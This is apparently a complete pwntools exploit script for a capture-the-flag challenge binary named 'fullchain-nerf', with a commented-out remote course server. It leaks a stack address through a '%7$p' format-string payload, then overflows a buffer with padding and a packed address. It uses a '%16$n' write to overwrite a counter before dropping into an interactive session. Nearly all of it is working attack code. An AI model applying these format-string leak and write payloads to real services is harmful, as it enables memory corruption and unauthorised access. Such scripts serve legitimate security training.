from pwn import *

context.arch = 'amd64'
# context.terminal = ['tmux', 'splitw', '-h']

# r = remote('edu-ctf.zoolab.org', 30206)
r = process('./fullchain-nerf')
# print('hi')
# gdb.attach(r)
# print('hi')
r.sendlineafter("global or local > ", b'local')
print('hi')
r.sendlineafter('set, read or write > ', b'write%7$p')
print('hi')
r.recvuntil(b'write')
cnt = r.recvuntil('g')[:-1]

print(cnt)
cnt_address = int(cnt.decode(), base = 16) + int(0x24)
print(hex(cnt_address))
r.sendlineafter("lobal or local > ", b'local')
r.sendlineafter('set, read or write > ', b'read')

r.sendafter('length > ', str(0x20).encode())
r.sendline(b'a' * 16 + p64(cnt_address))

r.sendafter("global or local > ", b'local\n')
r.sendafter('set, read or write > ', b'write%16$n\n')

r.interactive()